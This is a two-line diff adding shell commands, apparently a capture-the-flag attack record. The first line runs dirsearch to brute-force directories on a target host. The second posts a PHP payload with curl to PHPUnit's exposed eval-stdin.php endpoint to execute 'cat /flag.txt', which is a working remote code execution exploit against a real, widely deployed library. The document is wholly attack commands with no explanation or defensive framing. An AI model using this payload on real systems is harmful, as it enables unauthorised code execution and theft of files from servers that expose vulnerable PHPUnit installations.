@@ -1,0 +1,2 @@
+python3 dirsearch.py -u http://35.198.135.192:32572/ -w ./db/dicc.txt
+curl --data "<?php echo exec('cat /flag.txt') ?>" 35.198.135.192:30141/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
